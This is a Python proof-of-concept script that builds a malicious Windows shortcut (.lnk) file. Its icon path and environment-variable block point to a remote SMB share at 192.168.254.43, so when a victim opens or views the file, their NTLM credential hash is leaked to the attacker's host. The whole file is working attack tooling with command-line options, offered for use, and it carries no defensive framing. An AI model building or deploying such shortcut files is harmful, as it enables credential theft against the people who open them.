import os
import struct
import uuid
from datetime import datetime
from pathlib import Path
from typing import Optional

class LnkCreator:
    """
    Creates a malicious LNK file that forces SMB hash leakage when opened.
    """
    
    # Constants
    HAS_LINK_TARGET_IDLIST = 0x00000001
    HAS_LINK_INFO = 0x00000002
    HAS_NAME = 0x00000004
    HAS_RELATIVE_PATH = 0x00000008
    HAS_WORKING_DIR = 0x00000010
    HAS_ARGUMENTS = 0x00000020
    HAS_ICON_LOCATION = 0x00000040
    IS_UNICODE = 0x00000080
    FORCE_NO_LINKINFO = 0x00000100
    HAS_EXP_STRING = 0x00000200
    RUN_IN_SEPARATE_PROCESS = 0x00000400
    HAS_LOGO3ID = 0x00000800
    HAS_DARWIN_ID = 0x00001000
    RUN_AS_USER = 0x00002000
    HAS_EXP_ICON = 0x00004000
    NO_PIDL_ALIAS = 0x00008000
    FORCE_USHORTCUT = 0x00010000
    RUN_WITH_SHIMLAYER = 0x00020000
    FORCE_NO_LINKTRACK = 0x00040000
    ENABLE_TARGET_METADATA = 0x00080000
    DISABLE_LINK_PATH_TRACKING = 0x00100000
    DISABLE_KNOWNFOLDER_TRACKING = 0x00200000
    DISABLE_KNOWNFOLDER_ALIAS = 0x00400000
    ALLOW_LINK_TO_LINK = 0x00800000
    UNALIAS_ON_SAVE = 0x01000000
    PREFER_ENVIRONMENT_PATH = 0x02000000
    KEEP_LOCAL_IDLIST_FOR_UNC = 0x04000000

    SW_SHOWNORMAL = 0x00000001
    SW_SHOWMAXIMIZED = 0x00000003
    SW_SHOWMINNOACTIVE = 0x00000007

    ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE = 0xA0000001
    FILE_ATTRIBUTE_NORMAL = 0x00000080

    def __init__(self, lnk_file_path: str = "poc.lnk", smb_share_path: str = "\\\\192.168.254.43\\evilshare\\test.exe", 
                 description: str = "NTLM grab"):
        """
        Initialize the LNK creator with the specified parameters.
        
        Args:
            lnk_file_path: Path where the LNK file will be created
            smb_share_path: UNC path to the malicious SMB share
            description: Description text for the LNK file
        """
        self.lnk_file_path = Path(lnk_file_path).absolute()
        self.smb_share_path = smb_share_path
        self.description = description
        
        # Validate paths and permissions
        self._validate_paths()

    def _validate_paths(self) -> None:
        """Validate that the target directory is writable."""
        try:
            # Try creating a test file in the target directory
            test_file = self.lnk_file_path.parent / f"test_{os.urandom(4).hex()}.tmp"
            test_file.write_text("test")
            test_file.unlink()
        except Exception as e:
            raise PermissionError(f"Cannot write to directory '{self.lnk_file_path.parent}'. "
                                 f"Access is denied or the path is invalid. Error: {str(e)}")

    def _write_struct(self, file, fmt: str, *values) -> None:
        """Helper method to write packed binary data."""
        file.write(struct.pack(fmt, *values))

    def create_lnk(self) -> None:
        """Create the malicious LNK file."""
        try:
            with open(self.lnk_file_path, 'wb') as f:
                # Write ShellLinkHeader
                self._write_header(f)
                
                # Write description
                self._write_description(f)
                
                # Write command line buffer
                self._write_command_line(f)
                
                # Write icon path
                self._write_icon_path(f)
                
                # Write environment variables data block
                self._write_environment_block(f)
                
            print(f"LNK file created successfully: {self.lnk_file_path}")
            print(f"Command line buffer size: 900 bytes")
            
        except Exception as e:
            print(f"Error: {str(e)}")
            raise

    def _write_header(self, file) -> None:
        """Write the ShellLinkHeader structure."""
        # Header structure
        header = {
            'HeaderSize': 0x0000004C,
            'LinkCLSID': uuid.UUID('{00021401-0000-0000-C000-000000000046}'),
            'LinkFlags': (self.HAS_NAME | self.HAS_ARGUMENTS | self.HAS_ICON_LOCATION | 
                         self.IS_UNICODE | self.HAS_EXP_STRING),
            'FileAttributes': self.FILE_ATTRIBUTE_NORMAL,
            'CreationTime': self._get_current_filetime(),
            'AccessTime': self._get_current_filetime(),
            'WriteTime': self._get_current_filetime(),
            'FileSize': 0,
            'IconIndex': 0,
            'ShowCommand': self.SW_SHOWNORMAL,
            'HotKey': 0,
            'Reserved1': 0,
            'Reserved2': 0,
            'Reserved3': 0
        }
        
        # Write header fields
        self._write_struct(file, '<I', header['HeaderSize'])
        self._write_struct(file, '16s', header['LinkCLSID'].bytes_le)
        self._write_struct(file, '<I', header['LinkFlags'])
        self._write_struct(file, '<I', header['FileAttributes'])
        self._write_struct(file, '<Q', header['CreationTime'])
        self._write_struct(file, '<Q', header['AccessTime'])
        self._write_struct(file, '<Q', header['WriteTime'])
        self._write_struct(file, '<I', header['FileSize'])
        self._write_struct(file, '<I', header['IconIndex'])
        self._write_struct(file, '<I', header['ShowCommand'])
        self._write_struct(file, '<H', header['HotKey'])
        self._write_struct(file, '<H', header['Reserved1'])
        self._write_struct(file, '<I', header['Reserved2'])
        self._write_struct(file, '<I', header['Reserved3'])

    def _get_current_filetime(self) -> int:
        """Get current time as FILETIME (100-nanosecond intervals since 1601-01-01)."""
        now = datetime.now()
        # Convert to timestamp (seconds since 1970-01-01)
        timestamp = now.timestamp()
        # Convert to FILETIME (100-ns intervals since 1601-01-01)
        # 11644473600 is the number of seconds between 1601-01-01 and 1970-01-01
        filetime = int((timestamp + 11644473600) * 10000000)
        return filetime

    def _write_description(self, file) -> None:
        """Write the description string."""
        desc_bytes = self.description.encode('utf-16le')
        self._write_struct(file, '<H', len(self.description))
        file.write(desc_bytes)

    def _write_command_line(self, file) -> None:
        """Write the command line buffer."""
        calc_cmd = ""
        cmd_line_buffer = [' '] * 900
        cmd_line_buffer[-len(calc_cmd):] = list(calc_cmd)
        cmd_line_str = ''.join(cmd_line_buffer)
        cmd_line_bytes = cmd_line_str.encode('utf-16le')
        self._write_struct(file, '<H', len(cmd_line_buffer))
        file.write(cmd_line_bytes)

    def _write_icon_path(self, file) -> None:
        """Write the icon path."""
        icon_path = f"{self.smb_share_path},0"
        icon_bytes = icon_path.encode('utf-16le')
        self._write_struct(file, '<H', len(icon_path))
        file.write(icon_bytes)

    def _write_environment_block(self, file) -> None:
        """Write the environment variables data block."""
        env_block_size = 0x00000314
        env_signature = self.ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE
        
        print("Creating Environment Variables Data Block:")
        print(f"  Using fixed block size: 0x{env_block_size:08X} ({env_block_size} bytes)")
        
        self._write_struct(file, '<I', env_block_size)
        print(f"  Write block size: {struct.calcsize('<I')} bytes written")
        
        self._write_struct(file, '<I', env_signature)
        print(f"  Wrote block signature: {struct.calcsize('<I')} bytes written")
        
        # Write TargetAnsi (fixed 260 bytes)
        ansi_buffer = self.smb_share_path.encode('ascii')[:260]
        ansi_buffer = ansi_buffer.ljust(260, b'\x00')
        file.write(ansi_buffer)
        print(f"  Write TargetAnsi: {len(ansi_buffer)} bytes written (fixed 260 bytes)")
        
        # Write TargetUnicode (fixed 520 bytes)
        unicode_buffer = self.smb_share_path.encode('utf-16le')[:520]
        unicode_buffer = unicode_buffer.ljust(520, b'\x00')
        file.write(unicode_buffer)
        print(f"  Write TargetUnicode: {len(unicode_buffer)} bytes written (fixed 520 bytes)")


def create_smb_hash_leak_lnk(lnk_file_path: Optional[str] = None, 
                            smb_share_path: Optional[str] = None, 
                            description: Optional[str] = None) -> None:
    """
    Create an LNK file that forces SMB hash leakage when opened.
    
    Args:
        lnk_file_path: Path to the LNK file to create (default: "poc.lnk")
        smb_share_path: UNC path to the malicious SMB share 
                       (default: "\\\\192.168.254.43\\evilshare\\test.exe")
        description: Description text for the LNK file (default: "NTLM grab")
    """
    # Set defaults if not provided
    lnk_file_path = lnk_file_path or "poc.lnk"
    smb_share_path = smb_share_path or "\\\\192.168.254.43\\evilshare\\test.exe"
    description = description or "NTLM grab"
    
    creator = LnkCreator(lnk_file_path, smb_share_path, description)
    creator.create_lnk()


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Create a malicious LNK file for SMB hash leakage')
    parser.add_argument('--lnk_file_path', default="poc.lnk", help='Path to the LNK file to create')
    parser.add_argument('--smb_share_path', default="\\\\192.168.254.43\\evilshare\\test.exe",
                      help='UNC path to the malicious SMB share')
    parser.add_argument('--description', default="NTLM grab", help='Description text for the LNK file')
    
    args = parser.parse_args()
    
    create_smb_hash_leak_lnk(
        lnk_file_path=args.lnk_file_path,
        smb_share_path=args.smb_share_path,
        description=args.description
    )
